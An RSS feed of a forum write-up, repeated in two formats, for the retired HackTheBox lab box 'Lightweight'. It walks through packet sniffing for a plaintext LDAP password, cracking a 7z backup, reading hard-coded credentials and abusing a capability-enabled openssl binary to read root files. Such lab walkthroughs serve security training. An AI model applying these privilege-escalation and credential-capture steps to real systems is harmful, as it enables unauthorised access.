@@ -1,0 +1,211 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>HackTheBox LIghtweight write-up</title>
+    <link>https://d.clarkee.co.uk/t/hackthebox-lightweight-write-up/13590</link>
+    <description># HackTheBox Lightweight
+Heyo nullers :D
+Welcome to my writeup for the recently retired box Lightweight from HackTheBox.
+Lightweight was tricky at the beginning. In general, it had:
+* Packet sniffing
+* LDAP Authentication
+* Files&#39; capabilites
+
+Portscan:
+Nmap showed three open ports, i.e. ssh, http and ldap
+```
+Nmap scan report for 10.10.10.119
+Host is up (0.61s latency).
+Not shown: 997 filtered ports
+PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 19:97:59:9a:15:fd:d2:ac:bd:84:73:c4:29:e9:2b:73 (RSA)
+|   256 88:58:a1:cf:38:cd:2e:15:1d:2c:7f:72:06:a3:57:67 (ECDSA)
+|_  256 31:6c:c1:eb:3b:28:0f:ad:d5:79:72:8f:f5:b5:49:db (EdDSA)
+80/tcp  open  http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16)
+|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16
+|_http-title: Lightweight slider evaluation page - slendr
+389/tcp open  ldap    OpenLDAP 2.2.X - 2.3.X
+| ssl-cert: Subject: commonName=lightweight.htb
+| Subject Alternative Name: DNS:lightweight.htb, DNS:localhost, DNS:localhost.localdomain
+| Not valid before: 2018-06-09T13:32:51
+|_Not valid after:  2019-06-09T13:32:51
+|_ssl-date: TLS randomness does not represent time
+```
+
+On port 80:
+
+![port 80](upload://5xTCbRBbgBkYAWlm5WV5XYDKzcO.jpeg)
+
+The user page prompt me to login via ssh with my IP as username and password.
+So after doing that ~~and taking a hint from @pry0cc and @guly~~ I just &quot;listened&quot; to the box for as long as I had to. I ran ``tcpdump -i lo -A -w inter.pcap`` on the Lightweight box and then I just browsed the webpage. The status.php was taking quite a time to load, so that was suspicious.
+
+After browsing the website enough, I moved the pcap file to /tmp and transfered it to my local computer with ``scp 10.10.14.200@10.10.10.119:/tmp/inter.pcap .``
+
+Opening the file with wireshark, we find that there is an ldap &quot;bind request&quot; from ldapuser2 with **simple authentication**, meaning that the ldapuser2&#39;s password was in plain sight.
+
+![wire|690x373](upload://fk6bb0LeDUvkUlmVX803wh7yjMW.jpeg) 
+
+By using it we ``su`` to ldapuser2 we get the user flag.
+
+```
+su ldapuser2
+Password: 
+[ldapuser2@lightweight ~]$ ls
+backup.7z  OpenLDAP-Admin-Guide.pdf  OpenLdap.pdf  user.txt
+[ldapuser2@lightweight ~]$  cat user.txt
+8a866d3b*******************
+```
+
+In ldapuser2&#39;s home directory we find a backup.7z file. I transfered it to my local machine like the pcap file only to find out that it was password protected. There I used a script I found [here](https://gist.github.com/bcoles/421cc413d07cd9ba7855) which uses john to bruteforce the 7z file. The password was ```delete```
+
+There I found some php files, which are the same from the website, only with a twist:
+after running ``cat * | grep user`` in a desparate move for something valueable, I found that the user is ldapuser1, 
+
+```
+vict0ni@vict0niLaptop:~/Desktop/CTF/HTB/Lightweight/backup$ cat * | grep username
+$username = &#39;ldapuser1&#39;;
+```
+
+so the next logical thing to do is to run ``cat * | grep password``, where we find the ldapuser1&#39;s password
+
+```
+vict0ni@vic0niLaptop:~/Desktop/CTF/HTB/Lightweight/backup$ cat * | grep password
+$password = &#39;f3ca9d298a553da117442deeb6fa932d&#39;;
+if ($bind=ldap_bind($ds, $dn, $password)) {
+...
+...
+```
+
+Escalating to ldapuser1, like previously with ldapuser2.
+
+```
+[ldapuser2@lightweight ~]$ su ldapuser1
+Password: 
+[ldapuser1@lightweight ldapuser2]$ whoami
+ldapuser1
+```
+
+There, root got a bit spoiled to me, because some people where giving away clues inside the box. Specific, one broadcasted the message &quot;openssl is the key&quot;. Kind of a bummer but finding two binaries on the home directory was meaning that the way for root had to do with one of them. So the spoil just saved me a rabbithole. But, please, **don&#39;t** spoil things.
+
+I enumerated the openssl binary I had in front of me. After examing it&#39;s capabilities with ``getcap -r openssl`` the output was ``openssl =ep``, which means that it had access to anything.
+
+So to get the root.txt file, one must grab it with openssl, encrypt it and paste it in a directory, then decrypt it to read it, like ``/home/ldapuser1/openssl enc -base64 -in /root/root.txt -out enc_root`` and then ``base64 -d enc_root``.
+And there is the *sweet* root flag :D
+
+```
+[ldapuser1@lightweight ~]$ /home/ldapuser1/openssl enc -base64 -in /root/root.txt -out enc_root
+[ldapuser1@lightweight ~]$ base64 -d enc_root
+f1d4e309c*******************
+```
+
+PS: As @PresComm once said: &quot;But if you don&#39;t get a shell and can&#39;t run code, is a system really owned? :thinking:&quot;.
+Searching for some way to get a root shell I came across [this](https://medium.com/@int0x33/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099) article, where one can rewrite the /etc/shadow file.
+
+
+![vict0ni](//0x00sec.s3.dualstack.us-east-1.amazonaws.com/original/2X/1/108227f7e5845f11e6123c59b317ce1354a228e5.png)</description>
+    
+    <lastBuildDate>Sun, 12 May 2019 23:22:49 +0000</lastBuildDate>
+    <category>Hackthebox Writeups</category>
+    <atom:link href="https://d.clarkee.co.uk/t/hackthebox-lightweight-write-up/13590.rss" rel="self" type="application/rss+xml" />
+      <item>
+        <title>HackTheBox LIghtweight write-up</title>
+        <dc:creator><![CDATA[0xF61]]></dc:creator>
+        <description><![CDATA[
+            <p>maybe sudoers, instead of brickin shadow file ?</p>
+          <p><a href="https://d.clarkee.co.uk/t/hackthebox-lightweight-write-up/13590/2">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/hackthebox-lightweight-write-up/13590/2</link>
+        <pubDate>Sun, 12 May 2019 23:22:49 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-13590-2</guid>
+        <source url="https://d.clarkee.co.uk/t/hackthebox-lightweight-write-up/13590.rss">HackTheBox LIghtweight write-up</source>
+      </item>
+      <item>
+        <title>HackTheBox LIghtweight write-up</title>
+        <dc:creator><![CDATA[vict0ni]]></dc:creator>
+        <description><![CDATA[
+            <h1>HackTheBox Lightweight</h1>
+<p>Heyo nullers <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"><br>
+Welcome to my writeup for the recently retired box Lightweight from HackTheBox.<br>
+Lightweight was tricky at the beginning. In general, it had:</p>
+<ul>
+<li>Packet sniffing</li>
+<li>LDAP Authentication</li>
+<li>Files’ capabilites</li>
+</ul>
+<p>Portscan:<br>
+Nmap showed three open ports, i.e. ssh, http and ldap</p>
+<pre><code class="lang-auto">Nmap scan report for 10.10.10.119
+Host is up (0.61s latency).
+Not shown: 997 filtered ports
+PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 19:97:59:9a:15:fd:d2:ac:bd:84:73:c4:29:e9:2b:73 (RSA)
+|   256 88:58:a1:cf:38:cd:2e:15:1d:2c:7f:72:06:a3:57:67 (ECDSA)
+|_  256 31:6c:c1:eb:3b:28:0f:ad:d5:79:72:8f:f5:b5:49:db (EdDSA)
+80/tcp  open  http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16)
+|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16
+|_http-title: Lightweight slider evaluation page - slendr
+389/tcp open  ldap    OpenLDAP 2.2.X - 2.3.X
+| ssl-cert: Subject: commonName=lightweight.htb
+| Subject Alternative Name: DNS:lightweight.htb, DNS:localhost, DNS:localhost.localdomain
+| Not valid before: 2018-06-09T13:32:51
+|_Not valid after:  2019-06-09T13:32:51
+|_ssl-date: TLS randomness does not represent time
+</code></pre>
+<p>On port 80:</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/2/26dfcabf68e47d1860038092258b48bf4aee3166.jpeg" data-download-href="/uploads/short-url/5xTCbRBbgBkYAWlm5WV5XYDKzcO.jpeg?dl=1" title="port 80"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/2/26dfcabf68e47d1860038092258b48bf4aee3166_2_690x351.jpeg" alt="port 80" data-base62-sha1="5xTCbRBbgBkYAWlm5WV5XYDKzcO" width="690" height="351" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/2/26dfcabf68e47d1860038092258b48bf4aee3166_2_690x351.jpeg, https://0x00sec.s3.amazonaws.com/optimized/2X/2/26dfcabf68e47d1860038092258b48bf4aee3166_2_1035x526.jpeg 1.5x, https://0x00sec.s3.amazonaws.com/optimized/2X/2/26dfcabf68e47d1860038092258b48bf4aee3166_2_1380x702.jpeg 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/2/26dfcabf68e47d1860038092258b48bf4aee3166_2_10x10.png"></a></div><p></p>
+<p>The user page prompt me to login via ssh with my IP as username and password.<br>
+So after doing that <s>and taking a hint from <a class="mention" href="https://d.clarkee.co.uk/u/pry0cc">@pry0cc</a> and <a class="mention" href="https://d.clarkee.co.uk/u/guly">@guly</a></s> I just “listened” to the box for as long as I had to. I ran <code>tcpdump -i lo -A -w inter.pcap</code> on the Lightweight box and then I just browsed the webpage. The status.php was taking quite a time to load, so that was suspicious.</p>
+<p>After browsing the website enough, I moved the pcap file to /tmp and transfered it to my local computer with <code>scp 10.10.14.200@10.10.10.119:/tmp/inter.pcap .</code></p>
+<p>Opening the file with wireshark, we find that there is an ldap “bind request” from ldapuser2 with <strong>simple authentication</strong>, meaning that the ldapuser2’s password was in plain sight.</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/6/b/6b66428c80523a464a43588d51efe416067f92e6.jpeg" data-download-href="/uploads/short-url/fk6bb0LeDUvkUlmVX803wh7yjMW.jpeg?dl=1" title="wire"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/6/b/6b66428c80523a464a43588d51efe416067f92e6_2_690x373.jpeg" alt="wire" data-base62-sha1="fk6bb0LeDUvkUlmVX803wh7yjMW" width="690" height="373" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/6/b/6b66428c80523a464a43588d51efe416067f92e6_2_690x373.jpeg, https://0x00sec.s3.amazonaws.com/optimized/3X/6/b/6b66428c80523a464a43588d51efe416067f92e6_2_1035x559.jpeg 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/6/b/6b66428c80523a464a43588d51efe416067f92e6_2_1380x746.jpeg 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/6/b/6b66428c80523a464a43588d51efe416067f92e6_2_10x10.png"></a></div><p></p>
+<p>By using it we <code>su</code> to ldapuser2 we get the user flag.</p>
+<pre><code class="lang-auto">su ldapuser2
+Password: 
+[ldapuser2@lightweight ~]$ ls
+backup.7z  OpenLDAP-Admin-Guide.pdf  OpenLdap.pdf  user.txt
+[ldapuser2@lightweight ~]$  cat user.txt
+8a866d3b*******************
+</code></pre>
+<p>In ldapuser2’s home directory we find a backup.7z file. I transfered it to my local machine like the pcap file only to find out that it was password protected. There I used a script I found <a href="https://gist.github.com/bcoles/421cc413d07cd9ba7855">here</a> which uses john to bruteforce the 7z file. The password was <code>delete</code></p>
+<p>There I found some php files, which are the same from the website, only with a twist:<br>
+after running <code>cat * | grep user</code> in a desparate move for something valueable, I found that the user is ldapuser1,</p>
+<pre><code class="lang-auto">vict0ni@vict0niLaptop:~/Desktop/CTF/HTB/Lightweight/backup$ cat * | grep username
+$username = 'ldapuser1';
+</code></pre>
+<p>so the next logical thing to do is to run <code>cat * | grep password</code>, where we find the ldapuser1’s password</p>
+<pre><code class="lang-auto">vict0ni@vic0niLaptop:~/Desktop/CTF/HTB/Lightweight/backup$ cat * | grep password
+$password = 'f3ca9d298a553da117442deeb6fa932d';
+if ($bind=ldap_bind($ds, $dn, $password)) {
+...
+...
+</code></pre>
+<p>Escalating to ldapuser1, like previously with ldapuser2.</p>
+<pre><code class="lang-auto">[ldapuser2@lightweight ~]$ su ldapuser1
+Password: 
+[ldapuser1@lightweight ldapuser2]$ whoami
+ldapuser1
+</code></pre>
+<p>There, root got a bit spoiled to me, because some people where giving away clues inside the box. Specific, one broadcasted the message “openssl is the key”. Kind of a bummer but finding two binaries on the home directory was meaning that the way for root had to do with one of them. So the spoil just saved me a rabbithole. But, please, <strong>don’t</strong> spoil things.</p>
+<p>I enumerated the openssl binary I had in front of me. After examing it’s capabilities with <code>getcap -r openssl</code> the output was <code>openssl =ep</code>, which means that it had access to anything.</p>
+<p>So to get the root.txt file, one must grab it with openssl, encrypt it and paste it in a directory, then decrypt it to read it, like <code>/home/ldapuser1/openssl enc -base64 -in /root/root.txt -out enc_root</code> and then <code>base64 -d enc_root</code>.<br>
+And there is the <em>sweet</em> root flag <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
+<pre><code class="lang-auto">[ldapuser1@lightweight ~]$ /home/ldapuser1/openssl enc -base64 -in /root/root.txt -out enc_root
+[ldapuser1@lightweight ~]$ base64 -d enc_root
+f1d4e309c*******************
+</code></pre>
+<p>PS: As <a class="mention" href="https://d.clarkee.co.uk/u/prescomm">@PresComm</a> once said: “But if you don’t get a shell and can’t run code, is a system really owned? <img src="https://0x00sec.org/images/emoji/twitter/thinking.png?v=9" title=":thinking:" class="emoji" alt=":thinking:">”.<br>
+Searching for some way to get a root shell I came across <a href="https://medium.com/@int0x33/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099">this</a> article, where one can rewrite the /etc/shadow file.</p>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/1/108227f7e5845f11e6123c59b317ce1354a228e5.png" alt="vict0ni" width="" height=""></p>
+          <p><a href="https://d.clarkee.co.uk/t/hackthebox-lightweight-write-up/13590/1">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/hackthebox-lightweight-write-up/13590/1</link>
+        <pubDate>Sat, 11 May 2019 15:21:07 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-13590-1</guid>
+        <source url="https://d.clarkee.co.uk/t/hackthebox-lightweight-write-up/13590.rss">HackTheBox LIghtweight write-up</source>
+      </item>
+  </channel>
+</rss>
